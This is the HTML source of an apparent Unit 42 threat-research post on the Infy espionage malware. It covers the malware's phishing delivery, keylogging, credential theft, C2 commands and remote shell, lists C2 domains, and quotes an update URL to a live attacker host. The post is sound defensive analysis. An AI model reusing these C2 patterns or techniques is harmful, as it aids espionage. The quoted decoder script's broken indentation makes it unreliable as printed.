
<!doctype html>
<html >
  <head>
  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="apple-touch-icon" sizes="180x180" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/apple-touch-icon.png">
	<link rel="icon" type="image/png" sizes="32x32" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/favicon-32x32.png">
	<link rel="icon" type="image/png" sizes="16x16" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/favicon-16x16.png">
	<link rel="manifest" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/site.webmanifest">
	<link rel="mask-icon" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/safari-pinned-tab.svg" color="#000000">
	<meta name="msapplication-TileColor" content="#000000">
	<meta name="theme-color" content="#000">
  <title>Prince of Persia: Infy Malware Active In Decade of Targeted Attacks</title>
<link rel="alternate" hreflang="en" href="https://unit42.paloaltonetworks.com/prince-of-persia-infy-malware-active-in-decade-of-targeted-attacks/" />
<link rel="alternate" hreflang="ja" href="https://unit42.paloaltonetworks.jp/prince-of-persia-infy-malware-active-in-decade-of-targeted-attacks/" />

<!-- This site is optimized with the Yoast SEO plugin v12.6.2 - https://yoast.com/wordpress/plugins/seo/ -->
<meta name="description" content="Unit 42 identified and collected over 40 variants of an unpublished malware family dubbed Infy, which has been involved in attacks stretching back to 2007."/>
<meta name="robots" content="max-snippet:-1, max-image-preview:large, max-video-preview:-1"/>
<link rel="canonical" href="https://unit42.paloaltonetworks.com/prince-of-persia-infy-malware-active-in-decade-of-targeted-attacks/" />
<meta property="og:locale" content="en_US" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Prince of Persia: Infy Malware Active In Decade of Targeted Attacks" />
<meta property="og:description" content="Unit 42 identified and collected over 40 variants of an unpublished malware family dubbed Infy, which has been involved in attacks stretching back to 2007." />
<meta property="og:url" content="https://unit42.paloaltonetworks.com/prince-of-persia-infy-malware-active-in-decade-of-targeted-attacks/" />
<meta property="og:site_name" content="Unit42" />
<meta property="article:tag" content="AutoFocus" />
<meta property="article:tag" content="Infy" />
<meta property="article:tag" content="microsoft" />
<meta property="article:tag" content="WildFire" />
<meta property="article:section" content="Malware" />
<meta property="article:published_time" content="2016-05-02T02:00:08+00:00" />
<meta property="article:modified_time" content="2018-11-01T10:13:16+00:00" />
<meta property="og:updated_time" content="2018-11-01T10:13:16+00:00" />
<meta property="og:image" content="http://researchcenter.paloaltonetworks.com/wp-content/uploads/2016/04/Prince-of-Persia-1-500x275.png" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:description" content="Unit 42 identified and collected over 40 variants of an unpublished malware family dubbed Infy, which has been involved in attacks stretching back to 2007." />
<meta name="twitter:title" content="Prince of Persia: Infy Malware Active In Decade of Targeted Attacks" />
<meta name="twitter:image" content="http://researchcenter.paloaltonetworks.com/wp-content/uploads/2016/04/Prince-of-Persia-1-500x275.png" />
<!-- / Yoast SEO plugin. -->

<link rel='dns-prefetch' href='//www.google.com' />
<link rel='dns-prefetch' href='//s.w.org' />
<link rel="alternate" type="application/rss+xml" title="Unit42 &raquo; Prince of Persia: Infy Malware Active In Decade of Targeted Attacks Comments Feed" href="https://unit42.paloaltonetworks.com/prince-of-persia-infy-malware-active-in-decade-of-targeted-attacks/feed/" />
<meta property="og:likes" content="0"/>
<meta property="og:readtime" content="10"/>
<meta property="og:views" content="22,159"/>
<meta property="og:date_created" content="May 2, 2016 at 5:00 AM"/>
<meta property="og:post_length" content="2662"/>
<meta property="og:category" content="Malware"/>
<meta property="og:category" content="Threat Prevention"/>
<meta property="og:category" content="Unit 42"/>
<meta property="og:category_link" content="https://unit42.paloaltonetworks.com/category/malware-2/"/>
<meta property="og:category_link" content="https://unit42.paloaltonetworks.com/category/threat-prevention-2/"/>
<meta property="og:category_link" content="https://unit42.paloaltonetworks.com/category/unit42/"/>
<meta property="og:author" content="Tomer Bar"/>
<meta property="og:author" content="Simon Conant"/>
<meta property="og:authorlink" content="https://unit42.paloaltonetworks.com/author/tomer-bar/"/>
<meta property="og:authorlink" content="https://unit42.paloaltonetworks.com/author/tyler-halfpop/"/>
<meta property="og:author_image_link" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/11/unit-news-meta.svg"/>
<meta property="og:author_image_link" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/11/unit-news-meta.svg"/>
<script type="application/ld+json">{"@context":"https:\/\/schema.org","@type":"BlogPosting","headline":"Prince of Persia: Infy Malware Active In Decade of Targeted Attacks","name":"Prince of Persia: Infy Malware Active In Decade of Targeted Attacks","description":"This post is also available in: \u65e5\u672c\u8a9e (Japanese)Attack campaigns that have very limited scope often remain hidden for years. If only a few malware samples are deployed, it\u2019s less likely that security industry researchers will identify and connect them together. In May 2015, Palo Alto Networks WildFire detected two e-mails carrying malicious documents from a...","url":"https:\/\/unit42.paloaltonetworks.com\/prince-of-persia-infy-malware-active-in-decade-of-targeted-attacks\/","mainEntityOfPage":"https:\/\/unit42.paloaltonetworks.com\/prince-of-persia-infy-malware-active-in-decade-of-targeted-attacks\/","datePublished":"May 2, 2016","articleBody":"Attack campaigns that have very limited scope often remain hidden for years. If only a few malware samples are deployed, it\u2019s less likely that security industry researchers will identify and connect them together.\n\nIn May 2015, Palo Alto Networks WildFire detected two e-mails carrying malicious documents from a genuine and compromised Israeli Gmail account, sent to an Israeli industrial organization. One e-mail carried a Microsoft PowerPoint file named \u201cthanks.pps\u201d (VirusTotal), the other a Microsoft Word document named \u201crequest.docx\u201d.\n\nAround the same time, WildFire also captured an e-mail containing a Word document (\u201chello.docx\u201d) with an identical hash as the earlier Word document, this time sent to a U.S. Government recipient.\n\nBased on various attributes of these files and the functionality of the malware they install, we have identified and collected over 40 variants of a previously unpublished malware family we call Infy, which has been involved in attacks stretching back to 2007. Attacks using this tool were still active as of April 2016.\nAttack Technique\nThe attacks we have identified carrying Infy begin with a spear-phishing e-mail carrying a Word or PowerPoint document. The attached document file contains a multi-layer Self-Extracting Executable Archive (SFX), and content attempting to social engineer the recipient into activating the executable. In this example, the PPS file, when clicked, opens in \u201cPowerPoint Show\u201d mode. The user sees a PowerPoint page (Figure 1) that mimics a paused movie, and is tricked into clicking \u201cRun\u201d (Figure 2), which allows the embedded SFX file to execute.\n\n\nFigure 1 PowerPoint page mimics a paused video\n\nFigure 2 User tricked into running embedded SFX EXE\nOne of the SFX layers is encrypted with the key \u201c1qaz2wsx3edc\u201d. The package (Figure 3) typically includes a fake readme.txt file as camouflage (for example, impersonating an Aptana Studio application), and in some campaigns, image or video files (Figure 4). The executable typically has a filename pattern ins[*].exe where * are random digits of up to 4 characters. The main payload is a DLL file with a typical filename pattern mpro[*].dll where * are random digits of up to 3 characters (early versions used a .cpl extension).\n\n\nFigure 3 Embedded SFX contents\n\n\n\nFigure 4 Some campaigns include image or video files as camouflage\nThe executable installs the DLL, writes to the autorun registry key, and doesn\u2019t activate until a reboot. After reboot, it first checks for antivirus and then connects to the C2. It starts collecting environment data, initiates a keylogger, and steals browser passwords and content such as cookies, before exfiltrating the stolen data to the C2 server.\n\nThe initially-observed \u201cthanks.pps\u201d example tricks the user into running the embedded file named ins8376.exe which loads a payload DLL named mpro324.dll.\nInfrastructure\nIn our initial samples, we observed C2 servers updateserver3[.]com and us1s2[.]strangled[.]net.\n\nOther campaigns use a combination of Dynamic DNS providers, third-party site hosting services, and apparently first-party-registered domains as C2 servers.\n\nAnalysis of hosting and WHOIS data (Figure 5) led to a total of 12 related first-party-registered domains used for C2 servers:\n\n\tbestbox3[.]com\n\tmyblog2000[.]com\n\tsafehostonline[.]com\n\tupdateserver3[.]com\n\tshort-name[.]com\n\tbestupdateserver2[.]com\n\tbestwebstat[.]com\n\tupdatebox4[.]com\n\tbestupdateserver[.]com\n\tshort-url20[.]com\n\tupdateserver1[.]com\n\tbox4054[.]net\n\nAges of these domains suggest that some may have been used for malicious activity back as far as early 2010.\n\nWe found a report by the Danish Defense Intelligence Service\u2019s Center for Cybersecurity, which had observed similar attacks against Danish Government targets, and documented a small portion of the same C2 infrastructure.\n\n\nFigure 5 Infrastructure and Actor information related to Infy Attacks\nWe initially found a file with an identical hash as the originally-observed PowerPoint file, but a different filename (\u201csyria.pps\u201d), uploaded to VirusTotal (Figure 6) also in May of 2015. A characteristic observed across these campaigns is that the actor puts deliberate effort into the specific geographic targeting, with region-specific attack content.\n\n\nFigure 6 Powerpoint file uploaded to VirusTotal with a different file name\nWe were subsequently able to pivot and associate additional malware and campaigns based on infrastructure, hashes, strings, and payload links and similarities. The most conclusive evidence that all of these are linked is found in a single key, used to encode strings within the malware across all examples. Only the offset varies: older versions encode just the C2 data, newer versions encode most strings, and some double-encode the C2 data with two different offsets. The following script can be used to decode these strings:\nimport string\nimport base64\nFIRST_PHASE = \"OQTJEqtsK0AUB9YXMwr8idozF7VWRPpnhNCHI6Dlkaubyxf5423jvcZ1LSGmge\"\nSECOND_PHASE = \"\" + \"PqOwI1eUrYtT2yR3p4E5o6WiQu7ASlDkFj8GhHaJ9sKdLfMgNzBx0ZcXvCmVnb\u201c\ndef decrypt(input, offset=-10):\n    result = \"\"\n    for i, c in enumerate(input):\n        i = i % 62 + 1\n        try:\n         index = FIRST_PHASE.index(c)\n     except ValueError:\n         result += c\n         continue\n     translated = SECOND_PHASE[(index - i + offset) % len(SECOND_PHASE)]\n     result += translated\nreturn result\n\nBased on this specific encoding technique and key, we have identified related Infy samples from as early as mid 2007 (Figure 7), although more frequent related activity is observed after 2011. Historic registration of the C2 domain associated with the oldest sample that we found, fastupdate[.]net, suggests that it may have been associated with malicious activity as far back as December 2004.\n\nOver the years, we notice continued development and feature improvement in the code. For instance, support for the new Microsoft Edge browser was recently introduced in \u201cversion 30\u201d.\n\n\nFigure 7 Oldest related example found dates to 2007\nMost of the associated malware samples dating back over the last five years were eventually detected by antivirus programs, but in most cases with a generic signature. Other examples are named with multiple unrelated signature classifications, including Win32\/Tuax.A (very old versions), W32\/ADOKOOB, Win32\/Cloptern.A &amp; B (old versions), TR\/Graftor.106254, TR\/Spy.Arpnatis.A, and Win32\/Skeeyah.A!bit.\n\nWe refer to the malware as \u201cInfy\u201d because the actor used this string in multiple locations, including filenames (\u201cinfy74f1.exe\u201d - Infy version 7.4 F1), C2 strings (\u201csubject=INFY M 7.8\u201d), and C2 folder names.\nAttribution\nThe Gmail account sending the emails in the attack that we first observed (Figure 8), belongs to an Israeli victim. That account was itself victim of an e-mail-borne attack that compromised the user's system and e-mail account.\n\n&nbsp;\n\n\nFigure 8 First-observed attack, via email\nAmong WHOIS records for first-party domains used in the C2 infrastructure, we find three email accounts bearing a strong similarity in naming pattern:\n\n\n\nThe WHOIS records with the first two email addresses (and other C2 domains) have apparently fake WHOIS content. The \u201caminjalali_58 (at) yahoo.com\u201d email address is associated with 6 known C2 domains, dating back to 2010. Unlike the fake WHOIS examples, this example has content more consistent with the email address:\n\namin jalali\nsafehostonline\nafriqa street number 68\ntehran\nTehran\n19699\nIR\n+98.935354252\naminjalali_58 (at) yahoo.com\n\nThe name \u201cAmin Jalali\u201d is not unique, though it does appear to have Iranian-specific origins. We find profiles and artifacts combining the name and \u201c58\u201d, which may (or may not) be the same individual, and all of which have Iranian links.\n\nWhen we look at domains on neighboring IP addresses from known first-party C2s, we observe numerous Iranian domains, suggesting possibly an Iranian hosting reseller \u2013 and in at least one case, a free Iranian web host (Figure 9).\n\n\nFigure 9 Neighbor IP addresses with Iranian domains\n\nConclusion\nWe have enough evidence to conclude a pattern of behavior following extensive analysis of this malware and C2 infrastructure between these samples. The activity has been observed over almost 10 years, with the malware being constantly improved and developed. The low-volume of activity, deliberate campaign focus and content tailoring, and nature of targets hints at the goals of this actor.\n\nWe believe that we have uncovered a decade-long operation that has successfully stayed under the radar for most of its existence as targeted espionage originating from Iran. It is aimed at governments and businesses of multiple nations as well as its own citizens.\n\nPalo Alto Networks customers are protected from this threat in the following ways:\n\n\tWildFire accurately identifies all malware samples related to this operation as malicious.\n\tDomains used by this operation have been flagged as malicious in Threat Prevention.\n\tAutoFocus users can view malware related to this attack using the \u201cInfy tag.\n\nIOCs can be found in the appendices of this report.\n\nSpecial thanks to Michael Scott for assistance with Maltego in this investigation.\nAppendix 1 - Detailed Infy Malware Analysis\nAlthough Infy is fundamentally one malware family, we observe two distinct variants. The regular variant \u201cInfy\u201d is versioned by the malware author 1-30 (1999 -15999 sub-versions). In addition, we observe a distinct variant \u201cInfy M\u201d developed in parallel with the regular variant since about 2013. Infy M appears to be a full featured variant, deployed against high-value targets. It includes more functionality: while the original variant has no remote control, \u201cM\u201d adds the ability for the C2 to issue commands to the malware via C2 PHP scripts; HTTP support; a hidden GUI control panel; and FTP client.\nInfy\nDetailed analysis of a recent Infy sample (version 30, active from 24 February 2016):\n\nThe initial executable first checks for installed antivirus programs. It uses the Windows API function \u201cGetFileattributeA\u201d on a list of several common AV installation directories, testing any positive return with \u201cfile_attribute_directory\". Depending on which AV Infy finds, it will either abort, or install the malicious Infy DLL using a different technique. This concern with avoiding client-AV detection, skipping installation rather than risk alerting, is somewhat noteworthy (as opposed to the relatively common sandbox-detection techniques). The EXE installs the DLL, writes to the autorun key, and does nothing else until restart.\n\nUpon restart, the EXE loader executes the main function, exported by the DLL malware file DLL (previously we observed functions named \u201cstart1\/start2\/start3\u201d) with the parameter \/rcv (this version uses a decryption offset of 19). It installs itself in \u201ccyberlink\u201d directory.\n\nIt will then search for files with \u201cbak\u201d, \u201ccsv\u201d, or \u201ccnt\u201d, extensions. If the parameter \u201c\/rcv\u201d was used, it starts a keylogger (the keylogger uses a window name \u201cTRON2VDLLB\u201d (GetMessageA\/translate message\/DispatchMessageA). It next registers hotkeys, and gets clipboard data. Get_browser_data steals passwords, forms, cookies, history (from Microsoft Edge, Internet Explorer, Google Chrome, Opera, and Firefox).\n\nThe malware connects to the C2 every five minutes using HTTP, posting:\n\n&lt;computer name&gt;\n&lt;user name&gt;\ndn = n1\nver = 30\nlfolder= f\ncpuid=\nmachineguid (from hklm\\SOFTWARE\\Microsoft\\Cryptography\\machineguid)\ntt= time\n\nAfter posting data about the infected system to the C2 server, the malware downloaded an update named \u201cv30nXf1.tmp\u201d file to %temp%\\drvtem64.tmp. If the download is successful, the malware writes \u201cOK, Downloaded [url file]\u201d to log file. It then connects again, with a similar posting format, but this time also adding \u201ctt=\u201d (time) and \u201ccpuid=\u201d. It installs the downloaded file with parameter \"-sp\/ins -pBA5a88E\". A third connection adds \u201csfolder\u201d, \u201csubject\u201d, and this time exfiltrates data in the \u201cbody=\u201d parameter.\n\nEach variant of Infy uses specific \u201ccover\u201d camouflage to with file metadata that makes it appear as though it is legitimate software. In this case, the file used the software name \u201cCyberlink,\u201d and a description of \u201cCLMediaLibrary Dynamic Link Library\u201d and listing version 4.19.9.98.\nInfy M\nWe observed the Infy M variant with versions 6.1 through 7.8, adding features including screen capture, document capture &amp; upload, and microphone capture. Infy M supports the following C2 commands:\n\nASIDLE - idle\nASDIR \u2013 directory list of files\nASPUT \u2013 download file\nASGET \u2013 upload file\nASZIPGET \u2013 upload as zip\nASDELETE \u2013 delete file\nASRENAME \u2013 rename file\nASRUN \u2013 execute file\nASENDTASK \u2013 terminate process\nASZIP \u2013 zip file\nASSHELL \u2013 remote shell\n\nThe \u201cM\u201d variant uses mostly distinct C2 servers from the regular Infy samples (although very recently, we also observed version 7.8 using C2 \u201cyouripinfo.com\u201d, previously seen as C2 for the regular variant):\n\nbestupdateserver[.]com \u2013 Observed 2013-12-09\nwww.bestupdateserver[.]com - Observed 2013-04-26\nbestbox3[.]com \u2013 Observed 2015-08-25\nwww.bestupdateserver2[.]com - Observed 2015-05-22\nbestupdateserver2[.]com \u2013 Observed 2014-07-16\nAnalysis of an early version of \u201cM\u201d, 6.2\nVersions 6.x of the Infy M variant camouflage themselves with file and window names set to Borland hcrtf. They use a single EXE, rather than a loader EXE and payload DLL as seen in the original variant. The malware initially performs a check to see if the victim as already infected by checking for window names \u201cBorland hcrtf 6.x\u201d or \u201cMacromedia Swsoc 7.x\u201d.\n\nWe have identified five hidden GUI control forms in Infy M, one of which is not used. The first form includes three possible parameters. Parameter \u201c\/ins\u201d installs the Trojan. It first creates and starts the service and on Windows versions prior to Vista it requires the \u201c\/s\u201d parameter. After installing itself, the malware deletes any previous Infy installations. The does this by terminating processes and deleting Infy files in %system32%, %appdata%, %appdata%\\hcrtf (for example, pre-6.1 files incsy32.exe, incs32.exe, ntvdn.exe, grep.exe, hcrtf.exe, grep.dll). It then renames the ini file from grepc.ini to hcrtfc.ini. It completes clean-up by deleting the \u201cinverse Ser32\u201d, \u201cgrep\u201d, and \u201chcrtf\u201d services. Finally, it downloads and executes the update file from the C2 at \/infy\/update.php.\n\nThe \/c (copy) parameter sets up autostart for the malware by writing to registry key \u201crun\u201d (Windows Vista and above) or \u201crunservices\u201d (versions prior to Windows Vista). The \/s (service) parameter creates and starts the service (Windows Vista and later). At this point, the malware waits, and handles any commands issued over HTTP from the C2 (for example, execute a remote shell upon receiving command \u201cASSHELL\u201d).\n\nThe second form monitors for new or modified document files using \u201cCreateIoCompletionPort\u201d and \u201cReadDirectoryChangesW\u201d. It targets document file types .doc, .xls , .jpg, .jpe, .txt, .htm, .pgp, .pdf, .zip, and .rar and ZIP compresses them (using the password \u201cZ8(2000_2001uI\u201d) into a file located at \\Program Files\\Yahoo!\\Messenger\\Profiles\\yfsbg\\yfsbg\\3dksf.tmp.\n\nThe third form takes a screen captures and stores it the \u201cyfsbg\u201d folder as 4dksf.tmp. It the uploads the screenshot and document-capture files using POST (instead of using GET as seen in the regular variants) to &lt;C2 server&gt;\/infy\/fms.php.\n\nThe fourth form is not used. The fifth form is used for microphone capture.\n\nThe 7.x versions install themselves as swsoc.exe (7.4 also seen using infy74f1.exe) at &lt;documents and settings&gt;\\all users\\application data\\macromedia\\8080\\swsoc.exe. They also create a subfolder \u201cfsbg\u201d, where they store the copies of documents opened by the user. These are stored with their CRC value as their filename, RAR compressed with the same password \u201cZ8(2000_2001uI\u201d.\n\nWe observed a server reply with error in the PHP, giving us some of their underlying file structure:\n\n&lt;b&gt;Warning&lt;\/b&gt;: Cannot modify header information - headers already sent by (output started at \/home\/bestupda\/public_html\/infy\/fms.php:115) in &lt;b&gt;\/home\/bestupda\/public_html\/infy\/fms.php&lt;\/b&gt; on line &lt;b&gt;116&lt;\/b&gt;&lt;br \/&gt;\n\nUpgrade requests are observed with this syntax (here, version 6.2 to the latest version):\n\nhttp:\/\/www.bestupdateserver.com\/infy\/update.php?cn=&lt;computername&gt;&amp;ver=6.2&amp;u=27\/3\/2016 20:37:23\nAppendix 2 \u2013 Observed Hashes\nA list of hashes for associated files observed in this operation can be found here.\nAppendix 3 \u2013 Observed Infy C2 Domains\nanalyse1[.]mooo[.]com\nbest[.]short-name[.]com\nbest2[.]short-name[.]com\nbest2[.]short-url20[.]com\nbest3[.]short-url20[.]com\nbest4[.]short-url20[.]com\nbest5[.]short-url20[.]com\nbest6[.]short-url20[.]com\nbest7[.]short-url20[.]com\nbestbox3[.]com\nbestupdateserver[.]com\nbestupdateserver2[.]com\nbestupser[.]awardspace[.]info\nbestwebstat[.]com\nbl2pe[.]bestwebstat[.]com\nbox4054[.]net\nc1[.]short-url20[.]com\ndbook[.]soon[.]it\ndsite[.]dyx[.]comextd[.]mine[.]bz\nfastecs[.]netfirms[.]com\nfastupdate[.]net\ngstat[.]strangled[.]net\nlost[.]updateserver1[.]com\nlu[.]ige[.]es\nmand[.]pwnz[.]org\nmyblog2000[.]com\nns2[.]myblog2000[.]com\nnus[.]soon[.]it\nsafehostonline[.]com\nsecup[.]soon[.]it\nshort-name[.]com\nshort-url20[.]com\nupdate[.]info[.]gf\nupdatebox4[.]com\nupdateserver1[.]com\nupdateserver3[.]com\nus1[.]short-name[.]com\nus12[.]short-url20[.]com\nus13[.]short-url20[.]com\nus15[.]short-url20[.]com\nus16[.]short-url20[.]com\nus1s2[.]strangled[.]net\nwep[.]archvisio[.]com\nwep[.]soon[.]it\nwpstat[.]mine[.]bz\nwpstat[.]strangled[.]net\nwww[.]fastupdate[.]net\nwww[.]updateserver1[.]com\nyouripinfo[.]com\n\n&nbsp;","publisher":{"@type":"Organization","@id":"#panworg"},"image":{"@type":"ImageObject","url":"","width":"","height":""},"author":[{"@type":"Person","name":"Tomer Bar"},{"@type":"Person","name":"Simon Conant"}]}</script><link rel='stylesheet' id='crayon-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/css/min/crayon.min.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel='stylesheet' id='crayon-theme-classic-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/themes/classic/classic.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel='stylesheet' id='crayon-font-monaco-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/fonts/monaco.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel='stylesheet' id='wp-block-library-css'  href='https://unit42.paloaltonetworks.com/wp-includes/css/dist/block-library/style.min.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='dashicons-css'  href='https://unit42.paloaltonetworks.com/wp-includes/css/dashicons.min.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='post-views-counter-frontend-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/post-views-counter/css/frontend.css?ver=1.3.1' type='text/css' media='all' />
<link rel='stylesheet' id='bodhi-svgs-attachment-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/svg-support/css/svgs-attachment.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='wpml-legacy-horizontal-list-0-css'  href='//unit42.paloaltonetworks.com/wp-content/plugins/sitepress-multilingual-cms/templates/language-switchers/legacy-list-horizontal/style.css?ver=1' type='text/css' media='all' />
<link rel='stylesheet' id='wpml-legacy-post-translations-0-css'  href='//unit42.paloaltonetworks.com/wp-content/plugins/sitepress-multilingual-cms/templates/language-switchers/legacy-post-translations/style.css?ver=1' type='text/css' media='all' />
<link rel='stylesheet' id='wordpress-popular-posts-css-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/wordpress-popular-posts/assets/css/wpp.css?ver=5.0.1' type='text/css' media='all' />
<link rel='stylesheet' id='unit42/css-css'  href='https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/dist/styles/main.css' type='text/css' media='all' />
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-includes/js/jquery/jquery.js?ver=1.12.4-wp'></script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var CrayonSyntaxSettings = {"version":"_2.7.2_beta","is_admin":"0","ajaxurl":"https:\/\/unit42.paloaltonetworks.com\/wp-admin\/admin-ajax.php","prefix":"crayon-","setting":"crayon-setting","selected":"crayon-setting-selected","changed":"crayon-setting-changed","special":"crayon-setting-special","orig_value":"data-orig-value","debug":""};
var CrayonSyntaxStrings = {"copy":"Press %s to Copy, %s to Paste","minimize":"Click To Expand Code"};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/js/min/crayon.min.js?ver=_2.7.2_beta'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var wpp_params = {"sampling_active":"0","sampling_rate":"100","ajax_url":"https:\/\/unit42.paloaltonetworks.com\/wp-json\/wordpress-popular-posts\/v1\/popular-posts","ID":"13441","token":"b09d8c8c9d","debug":""};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/wordpress-popular-posts/assets/js/wpp-5.0.0.min.js?ver=5.0.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var wpml_xdomain_data = {"css_selector":"wpml-ls-item","ajax_url":"https:\/\/unit42.paloaltonetworks.com\/wp-admin\/admin-ajax.php","current_lang":"en"};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/sitepress-multilingual-cms/res/js/xdomain-data.js?ver=4.3.5'></script>
<link rel='https://api.w.org/' href='https://unit42.paloaltonetworks.com/wp-json/' />
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://unit42.paloaltonetworks.com/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://unit42.paloaltonetworks.com/wp-includes/wlwmanifest.xml" /> 
<meta name="generator" content="WordPress 5.4.1" />
<link rel='shortlink' href='https://unit42.paloaltonetworks.com/?p=13441' />
<link rel="alternate" type="application/json+oembed" href="https://unit42.paloaltonetworks.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Fprince-of-persia-infy-malware-active-in-decade-of-targeted-attacks%2F" />
<link rel="alternate" type="text/xml+oembed" href="https://unit42.paloaltonetworks.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Fprince-of-persia-infy-malware-active-in-decade-of-targeted-attacks%2F&#038;format=xml" />
<meta name="generator" content="WPML ver:4.3.5 stt:1,28;" />
<meta name="google-site-verification" content="zHZtYOWm9hm4SZgsH7wqiYcOwmsAsxDUDU4UD1QxB40" /><style>#wpdevart_lb_overlay{background-color:#000000;} #wpdevart_lb_overlay.wpdevart_opacity{opacity:0.8 !important;} #wpdevart_lb_main_desc{
				 -webkit-transition: opacity 0.3s ease;
				 -moz-transition: opacity 0.3s ease;
				 -o-transition: opacity 0.3s ease;
				 transition: opacity 0.3s ease;} #wpdevart_lb_information_content{
				 -webkit-transition: opacity 0.3s ease;
				 -moz-transition: opacity 0.3s ease;
				 -o-transition: opacity 0.3s ease;
				 transition: opacity 0.3s ease;}
		#wpdevart_lb_information_content{
			width:100%;	
		}
		#wpdevart_info_counter_of_imgs{
			    display: inline-block;
				padding-left:15px;
				padding-right:4px;
				font-size:20px;
				color:#000000;
		}
		#wpdevart_info_caption{
			    display: inline-block;
				padding-left:15px;
				padding-right:4px;
				font-size:20px;
				color:#000000;
		}
		#wpdevart_info_title{
			    display: inline-block;
				padding-left:5px;
				padding-right:5px;
				font-size:15px;
				color:#000000;
		}
		@-webkit-keyframes rotate {
			to   {-webkit-transform: rotate(360deg);}
			from  {-webkit-transform: rotate(0deg);}
		}
		@keyframes rotate {
			to   {transform: rotate(360deg);}
			from  {transform: rotate(0deg);}
		}
		#wpdevart_lb_loading_img,#wpdevart_lb_loading_img_first{
			-webkit-animation: rotate 2s linear  infinite;
    		animation: rotate 2s linear infinite;
		}
	  </style>        <script>var $ = jQuery;</script>
  
  
<script type="text/javascript">
;(function(win, doc, style, timeout) {
var STYLE_ID = 'at-body-style';
function getParent() {
return doc.getElementsByTagName('head')[0];
}
function addStyle(parent, id, def) {
if (!parent) {
return;
}
var style = doc.createElement('style');
style.id = id;
style.innerHTML = def;
parent.appendChild(style);
}
function removeStyle(parent, id) {
if (!parent) {
return;
}
var style = doc.getElementById(id);
if (!style) {
return;
}
parent.removeChild(style);
}
addStyle(getParent(), STYLE_ID, style);
setTimeout(function() {
removeStyle(getParent(), STYLE_ID);
}, timeout);
}(window, document, "body {visibility:hidden !important}", 3000));
</script>

<script src="//assets.adobedtm.com/9273d4aedcd2/0d76ae0322d7/launch-425c423d843b.min.js" async></script>
<script type="text/javascript" src="https://www.paloaltonetworks.com/content/dam/pan/en_US/includes/attribution.js"></script>
  </head>
  <body class="post-template-default single single-post postid-13441 single-format-standard">
    <!--[if IE]>
      <div class="alert alert-warning">
        You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> to improve your experience.      </div>
    <![endif]-->
    <header class="haeder py-15 position-relative z-index-2">
  <div class="container px-sm-30 px-35">
    <div class="row">
      <div class="first-logo col-sm-auto col-6 mb-sm-0 mb-40 text-sm-center order-1">
                  <a href="https://www.paloaltonetworks.com/">
<!--<img src="/wp-content/uploads/2019/07/paloaltonetwork.svg" class="attachment-full size-full" alt="" height="43" width="124" />-->
<svg width="140" height="26" viewBox="0 0 140 26" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M59.4802 4.69592C57.6721 4.69592 55.7937 5.18876 53.469 6.43377L54.7605 9.62741C56.7794 8.50019 58.447 8.00735 59.6682 8.00735C61.0538 8.00735 61.6644 8.52395 61.6644 9.20483V9.25133C61.6644 9.72143 61.2883 9.97974 60.3729 10.0738L58.7766 10.238C54.7843 10.6606 53.1404 12.3985 53.1404 14.7934V14.9577C53.1404 17.2359 55.0188 19.0203 57.6721 19.0203C59.4192 19.0203 60.937 18.2826 61.8597 16.9807L62.1572 18.7857H65.7734V10.5904C65.7734 6.71584 63.5428 4.69592 59.4802 4.69592ZM59.1279 15.8969C57.7899 15.8969 57.1555 15.3803 57.1555 14.5816V14.5351C57.1555 13.8305 57.5543 13.3139 59.0101 13.1031L59.6445 13.0091C60.5713 12.8799 61.1406 12.7095 61.6644 12.3923V13.4317C61.6644 15.0052 60.6777 15.8969 59.1279 15.8969Z" fill="white"/>
<path d="M25.4785 4.78994L20.8528 0.164276L16.2271 4.78994L18.5281 7.09192L6.92828 18.6917L11.5539 23.3174L16.1796 18.6917L13.8787 16.3908L25.4785 4.78994Z" fill="white"/>
<path d="M11.6001 0.164048L0 11.7642L4.62603 16.3902L16.2262 4.79008L11.6001 0.164048Z" fill="white"/>
